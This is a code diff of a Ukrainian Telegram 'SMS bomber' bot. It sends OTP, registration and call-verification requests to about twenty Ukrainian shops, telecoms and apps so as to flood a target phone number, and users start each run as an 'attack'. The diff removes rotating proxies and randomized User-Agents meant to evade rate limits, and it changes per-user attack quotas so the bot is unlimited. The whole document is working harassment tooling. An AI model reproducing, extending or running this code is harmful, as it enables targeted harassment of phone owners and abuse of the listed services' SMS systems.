+        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://www.moyo.ua/identity/registration", data={"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, headers=headers_moyo, cookies=cookies_moyo, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://pizza.od.ua/ajax/reg.php", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", data={"phone": number[2:], "need_skeep": ""}, headers=headers_sushiya, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", data={"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", data={"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, headers=headers_zolota,cookies=cookies_zolota, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", data={"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, headers=headers_avtoria, cookies=cookies_avtoria, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", data={"phone": formatted_number6}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", data={"telephone": formatted_number7}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://api.iqos.com.ua/v1/auth/otp", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", method='POST', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://api-mobile.planetakino.ua/graphql", json={"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, headers=headers_elmir,cookies=cookies_elmir, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, headers=headers_elmir_call, cookies=cookies_elmir_call, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", json={"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth)
     ]
-    
-    # Створюємо tasks з унікальними проксі та User-Agent для кожного запиту
-    tasks = []
-    for url, kwargs, method in services:
-        proxy_url, proxy_auth = pick_proxy()  # Кожен запит отримує унікальний проксі
-        req_kwargs = kwargs.copy()
-        
-        # Генеруємо унікальний User-Agent для кожного запиту
-        unique_ua = fake_useragent.UserAgent().random
-        
-        # Додаємо headers якщо не вказані
-        if "headers" not in req_kwargs:
-            req_kwargs["headers"] = {"User-Agent": unique_ua}
-        else:
-            # Оновлюємо User-Agent навіть якщо headers вже є
-            if isinstance(req_kwargs["headers"], dict):
-                req_kwargs["headers"] = req_kwargs["headers"].copy()
-                req_kwargs["headers"]["User-Agent"] = unique_ua
-            else:
-                # Якщо headers - це вже об'єкт, створюємо новий словник
-                req_kwargs["headers"] = {"User-Agent": unique_ua}
-        
-        # Додаємо метод, проксі та авторизацію
-        req_kwargs["method"] = method
-        req_kwargs["proxy"] = proxy_url
-        req_kwargs["proxy_auth"] = proxy_auth
-        tasks.append(bounded_request(url, **req_kwargs))
 
     if not attack_flags.get(chat_id):
         return
         
-    # Рандомізуємо порядок сервісів на кожному етапі для максимальної випадковості
-    import random
-    random.shuffle(tasks)
-    logging.debug(f"[ATTACK] Перемішано {len(tasks)} сервісів")
-    
-    # Плавне надсилання повідомлень: розділяємо на батчі з паузами для стабільності
-    BATCH_SIZE = 5  # По 5 запитів одночасно
-    DELAY_BETWEEN_BATCHES = 0.2  # 200мс пауза між батчами
-    DELAY_BETWEEN_REQUESTS = 0.05  # 50мс пауза між окремими запитами в батчі
-    
-    async def execute_with_delay(task, delay):
-        """Виконує task з затримкою для плавного надсилання"""
-        await asyncio.sleep(delay)
-        return await task
-    
-    for i in range(0, len(tasks), BATCH_SIZE):
-        batch = tasks[i:i + BATCH_SIZE]
-        
-        # Виконуємо батч паралельно з невеликими затримками між запитами
-        batch_tasks = [execute_with_delay(task, j * DELAY_BETWEEN_REQUESTS) for j, task in enumerate(batch)]
-        
-        try:
-            await asyncio.gather(*batch_tasks, return_exceptions=True)
-        except Exception as e:
-            logging.debug(f"[ATTACK] Batch exception (non-critical): {e}")
-        
-        # Пауза між батчами (крім останнього) для стабільності
-        if i + BATCH_SIZE < len(tasks):
-            await asyncio.sleep(DELAY_BETWEEN_BATCHES)
-        
-        # Перевіряємо чи не зупинено атаку
+    for task in tasks:
         if not attack_flags.get(chat_id):
             return
+        await task
 
-async def start_attack(number, chat_id, status_message_id: int = None):
+async def start_attack(number, chat_id):
     global attack_flags
     attack_flags[chat_id] = True
     
-    timeout = 120  # 2 хвилини
+    timeout = 60
     start_time = asyncio.get_event_loop().time()
-    MAX_STAGES = 3  # Максимум 3 етапи
-    PAUSE_MIN = 10  # Мінімальна пауза між етапами (секунди)
-    PAUSE_MAX = 20  # Максимальна пауза між етапами (секунди)
-    
-    # Отримуємо список проксі один раз для всіх етапів
-    global_proxy_counter = {'value': 0}
-    global_proxies_pool = []  # Пул всіх доступних проксі
-    
-    if USE_PROXIES:
-        try:
-            global_proxies_pool = await get_available_proxies(min_success_rate=0, use_cache=False)
-            logging.info(f"[ATTACK] Завантажено {len(global_proxies_pool)} проксі для використання")
-        except Exception as e:
-            logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
-            global_proxies_pool = []
-
-    # Дебаунсинг та черга для update_status - оптимізована відправка повідомлень
-    _status_queue = asyncio.Queue()
-    _last_status_update = {'time': 0}
-    _status_task = None
-    
-    async def _status_updater():
-        """Фоновий процес для плавного оновлення статусів"""
-        while True:
-            try:
-                # Чекаємо повідомлення з черги
-                item = await asyncio.wait_for(_status_queue.get(), timeout=1.0)
-                if item is None:  # Сигнал завершення
-                    break
-                
-                text_to_send, show_cancel_btn = item
-                
-                # Додаткова затримка між оновленнями (1 сек) для плавності
-                now = asyncio.get_event_loop().time()
-                time_since_last = now - _last_status_update['time']
-                if time_since_last < 1.0:
-                    await asyncio.sleep(1.0 - time_since_last)
-                
-                _last_status_update['time'] = asyncio.get_event_loop().time()
-                
-                if status_message_id:
-                    try:
-                        # Якщо це повідомлення про зупинку, не показуємо кнопку
-                        reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
-                        await bot.edit_message_text(
-                            chat_id=chat_id,
-                            message_id=status_message_id,
-                            text=text_to_send,
-                            parse_mode="HTML",
-                            reply_markup=reply_markup
-                        )
-                    except Exception as e:
-                        # Якщо не вдалося оновити, створюємо нове
-                        logging.debug(f"Could not edit message, sending new: {e}")
-                        reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
-                        try:
-                            await bot.send_message(chat_id, text_to_send, parse_mode="HTML", reply_markup=reply_markup)
-                        except Exception:
-                            pass
-                else:
-                    reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
-                    try:
-                        await bot.send_message(chat_id, text_to_send, parse_mode="HTML", reply_markup=reply_markup)
-                    except Exception:
-                        pass
-            except asyncio.TimeoutError:
-                continue
-            except Exception as e:
-                logging.debug(f"Status updater error: {e}")
-    
-    # Запускаємо фоновий процес оновлення статусів
-    _status_task = asyncio.create_task(_status_updater())
-    
-    async def update_status(text: str, show_cancel: bool = True):
-        """Оновлює статус повідомлення через чергу для плавної відправки"""
-        # Додаємо в чергу (останній елемент завжди замінює попередній)
-        try:
-            # Очищаємо чергу від старих повідомлень (залишаємо тільки останнє)
-            while not _status_queue.empty():
-                try:
-                    _status_queue.get_nowait()
-                except asyncio.QueueEmpty:
-                    break
-            
-            # Додаємо нове повідомлення
-            await _status_queue.put((text, show_cancel))
-        except Exception as e:
-            logging.debug(f"Error adding to status queue: {e}")
 
     try:
-        # Перед атакою: перевіряємо проксі та оновлюємо метрики
-        try:
-            await ensure_recent_proxy_check()
-        except Exception as e:
-            logging.error(f"Помилка перевірки проксі (продовжуємо без неї): {e}")
-        
-        stage_num = 0
-        while (asyncio.get_event_loop().time() - start_time) < timeout and stage_num < MAX_STAGES:
+        while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.', show_cancel=False)
+                await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
                 return
             
-            stage_num += 1
-            logging.info(f"[ATTACK] Етап {stage_num}/{MAX_STAGES} для {number}")
-            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}', show_cancel=True)
-            
-            # Перемішуємо проксі на кожному етапі для максимізації випадковості
-            import random
-            shuffled_proxies_for_stage = global_proxies_pool.copy()
-            random.shuffle(shuffled_proxies_for_stage)
-            logging.info(f"[ATTACK] Етап {stage_num}: перемішано {len(shuffled_proxies_for_stage)} проксі")
-            
-            try:
-                # Виконуємо один етап атаки (прохід по всіх сервісах)
-                # Скидаємо лічильник для кожного етапу, але перемішуємо проксі заново
-                await ukr(number, chat_id, None, shuffled_proxies_for_stage)
-                logging.info(f"[ATTACK] Етап {stage_num} завершено")
-            except Exception as e:
-                logging.error(f"Помилка в етапі атаки (продовжуємо): {e}")
+            await ukr(number, chat_id)
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.', show_cancel=False)
+                await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
                 return
                 
-            # Пауза між етапами (якщо не останній етап і не вичерпано час)
-            if stage_num < MAX_STAGES and (asyncio.get_event_loop().time() - start_time) < (timeout - 10):
-                pause_time = random.randint(PAUSE_MIN, PAUSE_MAX)
-                logging.info(f"[ATTACK] Пауза {pause_time} сек перед наступним етапом...")
-                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}\n⏸ Пауза {pause_time} сек...', show_cancel=True)
-                
-                # Перевіряємо під час паузи чи не зупинили атаку
-                elapsed = 0
-                while elapsed < pause_time:
-                    if not attack_flags.get(chat_id):
-                        return
-                    sleep_chunk = min(5, pause_time - elapsed)  # Перевіряємо кожні 5 сек
-                    await asyncio.sleep(sleep_chunk)
-                    elapsed += sleep_chunk
+            await asyncio.sleep(0.1)
             
     except asyncio.CancelledError:
-        await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена.', show_cancel=False)
+        await bot.send_message(chat_id, "🛑 Атака зупинена.")
     except Exception as e:
-        logging.error(f"Критична помилка при виконанні атаки: {e}")
-        await update_status(f'❌ Помилка при виконанні атаки на номер <i>{number}</i>.', show_cancel=False)
+        logging.error(f"Помилка при виконанні атаки: {e}")
+        await bot.send_message(chat_id, "❌ Сталася помилка при виконанні атаки.")
     finally:
         attack_flags[chat_id] = False
-        # Зупиняємо фоновий процес оновлення статусів
-        if '_status_task' in locals() and _status_task:
-            try:
-                await _status_queue.put(None)  # Сигнал завершення
-                await asyncio.wait_for(_status_task, timeout=2.0)
-            except (asyncio.TimeoutError, asyncio.CancelledError):
-                _status_task.cancel()
-            except Exception as e:
-                logging.debug(f"Error stopping status updater: {e}")
 
     logging.info(f"Атака на номер {number} завершена")
     
@@ -1709,315 +1211,22 @@ async def start_attack(number, chat_id, status_message_id: int = None):
     referral_attacks = user_data['referral_attacks'] if user_data and 'referral_attacks' in user_data else 0
     total_attacks = attacks_left + promo_attacks + referral_attacks
     
-    # Оновлюємо фінальний статус в існуючому повідомленні
-    # Передаємо status_message_id через замикання
     inline_keyboard2 = types.InlineKeyboardMarkup()
     code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
     inline_keyboard2 = inline_keyboard2.add(code_sub)
-    
-    final_text = f"""👍 Атака на номер <i>{number}</i> завершена!
+    await bot.send_message(
+        chat_id=chat_id,
+        text=f"""👍 Атака на номер <i>{number}</i> завершена!
 
 🔥 Сподобалась робота бота? 
 Допоможи нам зростати — запроси друга!
 
-💬 Якщо є питання або пропозиції, звертайся до @Nobysss
+💬 Якщо є питання або пропозиції, звертайся до @ABOBA 
 
-Приєднуйся до нашого ком'юніті 👇"""
-    
-    if status_message_id:
-        try:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=status_message_id,
-                text=final_text,
+Приєднуйся до нашого ком'юніті 👇""",
         parse_mode="html",
         reply_markup=inline_keyboard2
     )
-        except Exception:
-            # Якщо не вдалося оновити, відправляємо нове повідомлення асинхронно
-            asyncio.create_task(bot.send_message(
-                chat_id=chat_id,
-                text=final_text,
-                parse_mode="html",
-                reply_markup=inline_keyboard2
-            ))
-    else:
-        asyncio.create_task(bot.send_message(
-            chat_id=chat_id,
-            text=final_text,
-            parse_mode="html",
-            reply_markup=inline_keyboard2
-        ))
-
-def parse_proxy_for_aiohttp(proxy_str: str):
-    try:
-        from urllib.parse import urlparse
-        parsed = urlparse(proxy_str)
-        if parsed.username and parsed.password:
-            auth = BasicAuth(parsed.username, parsed.password)
-            # rebuild without credentials
-            host = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}" if parsed.port else f"{parsed.scheme}://{parsed.hostname}"
-            return host, auth
-        return proxy_str, None
-    except Exception:
-        return proxy_str, None
-
-def mask_proxy_for_log(proxy_str: str) -> str:
-    try:
-        from urllib.parse import urlparse
-        parsed = urlparse(proxy_str)
-        host = parsed.hostname or proxy_str
-        port = f":{parsed.port}" if parsed.port else ""
-        scheme = parsed.scheme + "://" if parsed.scheme else ""
-        return f"{scheme}{host}{port}"
-    except Exception:
-        return proxy_str
-
-def normalize_proxy_string(raw: str) -> str:
-    # Convert multiple known forms to scheme://user:pass@host:port or scheme://host:port
-    import re
-    if '://' not in raw:
-        parts = raw.split(':')
-        if len(parts) == 4:
-            host, port, user, pwd = parts
-            return f"http://{user}:{pwd}@{host}:{port}"
-        if len(parts) == 2:
-            host, port = parts
-            return f"http://{host}:{port}"
-        return raw
-    m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
-    if m:
-        sch = m.group('sch')
-        host = m.group('host')
-        port = m.group('port')
-        user = m.group('user')
-        pwd = m.group('pwd')
-        return f"{sch}://{user}:{pwd}@{host}:{port}"
-    return raw
-
-async def check_proxy(proxy_url: str, timeout_sec: int = None) -> tuple:
-    start = asyncio.get_event_loop().time()
-    # Normalize on the fly for safety
-    try:
-        normalized = normalize_proxy_string(proxy_url)
-    except Exception:
-        normalized = proxy_url
-    url, auth = parse_proxy_for_aiohttp(normalized)
-    try:
-        logging.debug(f"[PROXY] Checking {mask_proxy_for_log(normalized)} via {url}")
-        # Використовуємо перевикористану сесію або створюємо нову для чекінгу
-        session = await get_http_session()
-        # Таймаут вимкнено для плавної роботи
-        timeout = None if timeout_sec is None else aiohttp.ClientTimeout(total=timeout_sec)
-        async with session.get('https://api.ipify.org?format=json', proxy=url, proxy_auth=auth, timeout=timeout) as resp:
-            ok = resp.status == 200
-            latency = int((asyncio.get_event_loop().time() - start) * 1000)
-            logging.debug(f"[PROXY] Result {mask_proxy_for_log(normalized)} => ok={ok}, latency={latency}ms, status={resp.status}")
-            return ok, latency
-    except Exception as e:
-        latency = int((asyncio.get_event_loop().time() - start) * 1000)
-        logging.debug(f"[PROXY] Error {mask_proxy_for_log(normalized)} => {e}, latency={latency}ms")
-        return False, latency
-
-async def ensure_recent_proxy_check(max_age_minutes: int = 10):
-    # Normalize any legacy proxy formats before checking
-    try:
-        await normalize_existing_proxies()
-    except Exception as e:
-        logging.error(f"[PROXY] Normalize before check failed: {e}")
-    async with db_pool.acquire() as conn:
-        proxies = await conn.fetch('SELECT id, proxy_url, last_check, success_count, fail_count FROM proxies WHERE is_active = TRUE')
-    now = datetime.now()
-    needs_check = []
-    for p in proxies:
-        if not p['last_check'] or (now - p['last_check']).total_seconds() > max_age_minutes * 60:
-            needs_check.append(p)
-    if not needs_check:
-        logging.info("[PROXY] No proxies need check (all fresh)")
-        return
-    # check in parallel
-    logging.info(f"[PROXY] Checking {len(needs_check)} proxies (stale or never checked)")
-    results = await asyncio.gather(*[check_proxy(p['proxy_url']) for p in needs_check], return_exceptions=True)
-    async with db_pool.acquire() as conn:
-        for p, res in zip(needs_check, results):
-            if isinstance(res, Exception):
-                ok, latency = False, 0
-            else:
-                ok, latency = res
-            if ok:
-                await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, success_count=success_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
-                logging.debug(f"[PROXY] Updated (OK) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
-            else:
-                await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, fail_count=fail_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
-                logging.debug(f"[PROXY] Updated (FAIL) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
-
-async def get_available_proxies(min_success_rate: int = 50, use_cache: bool = True):
-    """Отримує доступні проксі з weighted rotation та circuit breaker"""
-    async with _proxy_cache_lock:
-        cache_key = f"proxies_{min_success_rate}"
-        if use_cache and cache_key in _proxy_cache:
-            cached_data, cached_time = _proxy_cache[cache_key]
-            if (datetime.now() - cached_time).total_seconds() < 30:  # Cache на 30 сек
-                logging.debug(f"[PROXY] Using cached proxy list ({len(cached_data)} proxies)")
-                return cached_data
-    
-    async with db_pool.acquire() as conn:
-        rows = await conn.fetch('SELECT proxy_url, success_count, fail_count, avg_latency_ms FROM proxies WHERE is_active = TRUE AND last_check IS NOT NULL')
-    
-    available = []
-    now = asyncio.get_event_loop().time()
-    
-    # Circuit breaker: пропускаємо проксі, які нещодавно провалилися багато разів
-    CIRCUIT_BREAKER_THRESHOLD = 5  # Після 5 поспіль фейлів
-    CIRCUIT_BREAKER_COOLDOWN = 300  # 5 хвилин
-    
-    for r in rows:
-        total = r['success_count'] + r['fail_count']
-        rate = (r['success_count'] * 100 // total) if total > 0 else 0
-        
-        # Circuit breaker check
-        proxy_url = r['proxy_url']
-        if proxy_url in _proxy_circuit_breaker:
-            fail_count, last_fail = _proxy_circuit_breaker[proxy_url]
-            if fail_count >= CIRCUIT_BREAKER_THRESHOLD:
-                if now - last_fail < CIRCUIT_BREAKER_COOLDOWN:
-                    logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} in circuit breaker (cooldown)")
-                    continue
-                else:
-                    # Reset після cooldown
-                    _proxy_circuit_breaker.pop(proxy_url, None)
-        
-        if rate >= min_success_rate:
-            # Weighted selection: вища стабільність та нижча латентність = вища вага
-            latency_penalty = max(1, r['avg_latency_ms'] // 100)  # 100ms = 1 penalty point
-            weight = max(1, rate // latency_penalty)
-            _proxy_weights[proxy_url] = weight
-            available.append(proxy_url)
-            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)}: weight={weight}, rate={rate}%, latency={r['avg_latency_ms']}ms")
-        else:
-            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} filtered: rate={rate}% < {min_success_rate}%")
-    
-    # Cache результат
-    async with _proxy_cache_lock:
-        _proxy_cache[cache_key] = (available, datetime.now())
-    
-    logging.info(f"[PROXY] Available proxies (threshold {min_success_rate}%): {len(available)}/{len(rows)}")
-    return available
-
-def pick_weighted_proxy(proxies: list, index: int) -> tuple:
-    """Weighted random selection проксі"""
-    if not proxies:
-        return None, None
-    import random
-    if len(proxies) == 1:
-        selected = proxies[0]
-    else:
-        # Використовуємо ваги для selection
-        weights = [_proxy_weights.get(p, 1) for p in proxies]
-        selected = random.choices(proxies, weights=weights, k=1)[0]
-    
-    normalized = normalize_proxy_string(selected)
-    url, auth = parse_proxy_for_aiohttp(normalized)
-    logging.debug(f"[PROXY] Pick weighted proxy => {mask_proxy_for_log(normalized)}")
-    return url, auth
-
-async def load_proxies_from_file(file_path: str):
-    try:
-        with open(file_path, 'r', encoding='utf-8') as f:
-            lines = [l.strip() for l in f.readlines()]
-    except FileNotFoundError:
-        logging.info(f"Proxy file '{file_path}' not found. Skipping load.")
-        return
-    if not lines:
-        return
-    # normalize and insert
-    cleaned: list[str] = []
-    for line in lines:
-        if not line or line.startswith('#'):
-            continue
-        raw = line
-        # Support formats:
-        # - host:port
-        # - host:port:user:pass
-        # - scheme://user:pass@host:port
-        # - scheme://host:port:user:pass (convert to scheme://user:pass@host:port)
-        if '://' not in raw:
-            parts = raw.split(':')
-            if len(parts) == 4:
-                host, port, user, pwd = parts
-                url = f"http://{user}:{pwd}@{host}:{port}"
-            elif len(parts) == 2:
-                host, port = parts
-                url = f"http://{host}:{port}"
-            else:
-                url = raw
-                if not (url.startswith('http://') or url.startswith('https://') or url.startswith('socks5://')):
-                    url = 'http://' + url
-        else:
-            # Has scheme; try to detect scheme://host:port:user:pass
-            try:
-                import re
-                m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
-                if m:
-                    sch = m.group('sch')
-                    host = m.group('host')
-                    port = m.group('port')
-                    user = m.group('user')
-                    pwd = m.group('pwd')
-                    url = f"{sch}://{user}:{pwd}@{host}:{port}"
-                else:
-                    url = raw
-            except Exception:
-                url = raw
-        cleaned.append(url)
-    if not cleaned:
-        return
-    logging.info(f"[PROXY] Loaded {len(cleaned)} proxies from {file_path}")
-    async with db_pool.acquire() as conn:
-        for url in cleaned:
-            try:
-                await conn.execute('INSERT INTO proxies (proxy_url) VALUES ($1) ON CONFLICT (proxy_url) DO NOTHING', url)
-                logging.info(f"[PROXY] Inserted {mask_proxy_for_log(url)}")
-            except Exception as e:
-                logging.error(f"Failed to insert proxy {url}: {e}")
-
-async def load_proxies_from_possible_files():
-    # Try common filenames in order
-    for name in ["proxy", "proxy.txt", "proxies", "proxies.txt"]:
-        try:
-            await load_proxies_from_file(name)
-        except Exception as e:
-            logging.error(f"Failed to load from {name}: {e}")
-
-async def normalize_existing_proxies():
-    # Convert any scheme://host:port:user:pass rows to scheme://user:pass@host:port
-    import re
-    async with db_pool.acquire() as conn:
-        rows = await conn.fetch('SELECT id, proxy_url FROM proxies')
-    updates = []
-    for r in rows:
-        raw = r['proxy_url']
-        m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
-        if m:
-            sch = m.group('sch')
-            host = m.group('host')
-            port = m.group('port')
-            user = m.group('user')
-            pwd = m.group('pwd')
-            new_url = f"{sch}://{user}:{pwd}@{host}:{port}"
-            updates.append((new_url, r['id']))
-    if updates:
-        logging.debug(f"[PROXY] Normalizing {len(updates)} proxy URLs in DB")
-        async with db_pool.acquire() as conn:
-            for new_url, pid in updates:
-                try:
-                    await conn.execute('UPDATE proxies SET proxy_url=$1 WHERE id=$2', new_url, pid)
-                except Exception as e:
-                    # Тиха обробка дублікатів
-                    if 'duplicate' in str(e).lower() or 'unique' in str(e).lower():
-                        logging.debug(f"[PROXY] Duplicate proxy URL (skipping): {mask_proxy_for_log(new_url)}")
-                    else:
-                        logging.error(f"[PROXY] Error normalizing proxy {pid}: {e}")
 
 @dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
 @dp.throttled(anti_flood, rate=3)
@@ -2027,8 +1236,8 @@ async def handle_phone_number(message: Message):
         return  # Ігноруємо повідомлення з груп
     
     # Ігноруємо текст кнопок
-    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку', '❓ Перевірити атаки', '😋У мене є промокод']
-    if message.text in button_texts or message.text.strip().startswith('/stats'):
+    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку']
+    if message.text in button_texts:
         return
     
     user_id = message.from_user.id
@@ -2062,29 +1271,19 @@ async def handle_phone_number(message: Message):
             await message.answer(f"Номер <i>{number}</i> захищений від атаки.", parse_mode="html")
             return
 
-        # Перевірка лімітів: 30 атак/день + промо/реферальні
-        can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
-        if not can_attack:
-            await message.answer("❌ Капітане, на сьогодні ліміт атак вичерпано🙁. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом.")
-            return
-        # Резервуємо атаку: списуємо з пріоритетом промо -> реферальні -> звичайні
+        # Бот безлімітний - оновлюємо тільки дату останньої атаки
         async with db_pool.acquire() as conn:
-            if promo_attacks > 0:
-                await conn.execute('UPDATE users SET promo_attacks = promo_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
-                logging.info(f"[ATTACKS] User {user_id}: Spent 1 promo attack (was {promo_attacks}, now {promo_attacks - 1})")
-            elif referral_attacks > 0:
-                await conn.execute('UPDATE users SET referral_attacks = referral_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
-                logging.info(f"[ATTACKS] User {user_id}: Spent 1 referral attack (was {referral_attacks}, now {referral_attacks - 1})")
-            else:
-                await conn.execute('UPDATE users SET attacks_left = attacks_left - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
-                logging.info(f"[ATTACKS] User {user_id}: Spent 1 regular attack (was {attacks_left}, now {attacks_left - 1})")
+            await conn.execute(
+                'UPDATE users SET last_attack_date = $1 WHERE user_id = $2',
+                datetime.now(), user_id
+            )
         cancel_keyboard = get_cancel_keyboard()
         attack_flags[chat_id] = True 
-        status_msg = await message.answer(f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...', parse_mode="html", reply_markup=get_cancel_keyboard())
+        await message.answer(f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...', parse_mode="html", reply_markup=get_cancel_keyboard())
 
-        asyncio.create_task(start_attack(number, chat_id, status_msg.message_id))
+        asyncio.create_task(start_attack(number, chat_id))
     else:
-        await message.answer("⚠️ Ви некоректно ввели номер телефону!\nБудь ласка, перевірте формат і спробуйте ще раз</i>", parse_mode="html")
+        await message.answer("Невірний формат номера.\nВведіть номер повторно.\nПриклад: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")
 
 @dp.callback_query_handler(lambda c: c.data == "cancel_attack")
 async def cancel_attack(callback_query: types.CallbackQuery):
@@ -2121,30 +1320,18 @@ async def check_attack_limits(user_id: int):
             # Зберігаємо невикористані реферальні атаки
             if referral_attacks > 0:
                 unused_referral_attacks += referral_attacks
-            # Скидаємо звичайні атаки на 30, додаємо накопичені реферальні
-            new_attacks = 30 + unused_referral_attacks
+            # Скидаємо звичайні атаки на 6, додаємо накопичені реферальні
+            new_attacks = 6 + unused_referral_attacks
             await conn.execute(
                 "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                 new_attacks, today, user_id
             )
-            # Оновлюємо локальні змінні після оновлення БД
             attacks_left = new_attacks
             referral_attacks = 0
             unused_referral_attacks = 0
-            # Перечитую з БД для гарантії актуальності
-            result = await conn.fetchrow(
-                "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1",
-                user_id
-            )
-            if result:
-                attacks_left = result['attacks_left']
-                promo_attacks = result['promo_attacks']
-                referral_attacks = result['referral_attacks']
         
         total_attacks = attacks_left + promo_attacks + referral_attacks
         can_attack = total_attacks > 0
-        
-        logging.info(f"[ATTACKS] User {user_id}: total={total_attacks}, left={attacks_left}, promo={promo_attacks}, ref={referral_attacks}, can_attack={can_attack}")
         
